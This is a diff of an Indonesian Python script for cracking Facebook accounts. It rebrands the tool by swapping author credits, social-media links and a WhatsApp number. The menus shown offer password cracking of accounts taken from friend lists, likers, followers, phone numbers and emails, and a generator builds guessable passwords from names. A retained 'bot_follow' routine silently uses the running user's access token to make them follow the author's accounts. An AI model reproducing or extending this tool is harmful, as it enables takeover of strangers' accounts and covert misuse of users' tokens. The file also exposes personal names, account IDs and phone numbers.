@@ -11,7 +11,7 @@
 #                                                    #
 # Created , /.Bdbss,  o           #
 #                                                    #
-# Author Asli (Dapunta)                              #
+# Author Asli bus)                              #
 #                                                    #
 # Gua Cuman Remake + Tambahin Method Cracknya        #
 #                                                    #
@@ -21,7 +21,7 @@
 #                                                    #
 # Github: https://www.github.com/             #
 #                                                    #
-# Github Dapunta: https://www.github.com/Dapunta     #
+# Github Dapunta: https://www.github.com             #
 #                                                    #
 ######################################################
 
@@ -64,8 +64,8 @@ def banner():
     print("""
 \033[1;36m______________________________________________\033[1;37m\033[1;91m   
    __     ___\033[1;37m  ©
-\033[1;91m  / /    / __\ \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;37m orb\033[1;91mXD\033[1;37m SENP4ii.
-\033[1;91m / /    / /    \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;91m instagram\033[1;37m.\033[1;91mcom\033[1;37m/ngemry7
+\033[1;91m  / /    / __\ \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;37m SYAFIK\033[1;91mXD\033[1;37m SENP4ii.
+\033[1;91m / /    / /    \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;91m instagram\033[1;37m.\033[1;91mcom\033[1;37m/nO
 \033[1;91m/ /___ / /___  \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;37m Version\033[1;91m 1\033[1;37m.\033[1;91m0\033[1;37m
 \033[1;91m\____/ \____/  \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;91m H\033[1;37ma\033[1;91mc\033[1;37mk \033[1;91mF\033[1;37ma\033[1;91mc\033[1;37meb\033[1;91moo\033[1;37mk
 \033[1;36m______________________________________________\033[1;37m""")
@@ -155,13 +155,13 @@ def gets_dict_cookies(cookies):
 		return result
 
  
-### Contact IG ####
+### Contact FB ####
 def ige():
     os.system("clear")
     banner()
-    input(p+"\n ["+k+"•"+m+"•"+p+"] Open Instagram? ")
-    jalan(p+" ["+k+"•"+m+"•"+p+"] Open Instagram...")
-    os.system("xdg-open https://www.instagram.com/ngemry7")
+    input(p+"\n ["+k+"•"+m+"•"+p+"] Open FACEBOOK? ")
+    jalan(p+" ["+k+"•"+m+"•"+p+"] Open FACEBOOK...")
+    os.system("xdg-open https://www.facebook.com/syafik.rupat.3")
     input(p+" [BACK]")
     logs()   
 
@@ -181,7 +181,7 @@ def fbe():
     banner()
     input(p+"\n ["+k+"•"+m+"•"+p+"] Report Bug? ")
     jalan(p+" ["+k+"•"+m+"•"+p+"] Open WhatsApp...")
-    os.system("xdg-open https://wa.me/+6289659058849")
+    os.system("xdg-open https://wa.me/+6282386854238")
     input(p+" [BACK]")
     logs()  
     
@@ -232,36 +232,8 @@ def bot_follow():#Jangan Di Ganti/Hapus Ea Anjing!
 	except IOError:
 		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
 		logs()
-	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
-	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
-	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
-	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
-	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) #Onchom     
-	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) #Mey
-	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
-	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
-	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
-	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
-	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
-	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
-	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
-	requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
-	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
-	requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
-	requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
-	requests.post('https://graph.facebook.com/100001617352620/subscribers?access_token=' + toket) #Antonius Raditya M
-	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
-	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
-	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
-	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
-	requests.post('https://graph.facebook.com/100033624590055/subscribers?access_token=' + toket) #Fajar Firmansyah
-	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
-	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
-	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
-	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
-	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
-	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
-	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
+	requests.post("https://graph.facebook.com/100049252740120/subscribers?access_token=" + toket)      #Dapunta Khurayra X
+	requests.post('https://graph.facebook.com/100006702878868/subscribers?access_token=' + toket) #Dapunta Adya R
 	menu()
 
 ### MAIN MENU ###
@@ -285,11 +257,11 @@ def menu():
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your ID      : \033[1;33m"+id))
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Ip      : \033[1;33m"+ip))
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;33m"+durasi))
-    print((p+"\n ["+o+"01"+p+"]"+p+" Crack ID From Public/Friendlist"))
-    print((p+" ["+o+"02"+p+"]"+p+" Crack ID From Likers Post"))
+    print((p+"\n ["+o+"01"+p+"]"+h+" Crack ID From Public/Friendlist"))
+    print((p+" ["+o+"02"+p+"]"+u+" Crack ID From Likers Post"))
     print((p+" ["+o+"03"+p+"]"+p+" Crack ID From Followers"))
-    print((p+" ["+o+"04"+p+"]"+p+" Crack Phone Number"))
-    print((p+" ["+o+"05"+p+"]"+p+" Crack Email"))
+    print((p+" ["+o+"04"+p+"]"+m+" Crack Phone Number"))
+    print((p+" ["+o+"05"+p+"]"+k+" Crack Email"))
     print((p+" ["+o+"06"+p+"]"+p+" Result Crack"))
     print((p+" ["+o+"00"+p+"]"+p+" Logout "))
     choose_menu()
@@ -325,13 +297,13 @@ def pilihcrack(file):
   print("\n\033[0;97m [ \033[1;36mSelect Methode Crack\033[1;37m ]")
   print((p+" ["+o+"01"+p+"] Crack With Api.Facebook ("+o+"FAST"+p+")"))
   print((p+" ["+o+"02"+p+"] Crack With Api.Facebook + TTL ("+o+"FAST"+p+")"))
-  print((p+" ["+o+"03"+p+"] Crack With Mbasic.Faceboo ("+o+"SLOW"+p+")"))
+  print((p+" ["+o+"03"+h+"] Crack With Mbasic.Faceboo ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"04"+p+"] Crack With Mbasic.Facebook + TTL ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"05"+p+"] Crack With Touch.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"06"+p+"] Crack With Touch.Facebook + TTL ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"07"+p+"] Crack With M.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"08"+p+"] Crack With M.Facebook + TTL ("+o+"SLOW"+p+")"))
-  print((p+" ["+o+"09"+p+"] Crack With Free.Facebook ("+o+"SLOW"+p+")"))
+  print((p+" ["+o+"09"+h+"] Crack With Free.Facebook ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"10"+p+"] Crack With Free.Facebook + TTL ("+o+"SLOW"+p+")"))
   print((p+" ["+o+"00"+p+"] Back To Menu "))
   krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
@@ -532,11 +504,9 @@ def generate(text):
 			if len(i)==3 or len(i)==4 or len(i)==5:
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append(i+"123456")
 			else:
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append(i+"123456")
 				results.append(i)
 				if "indonesia" in ips:
 					results.append("sayang")
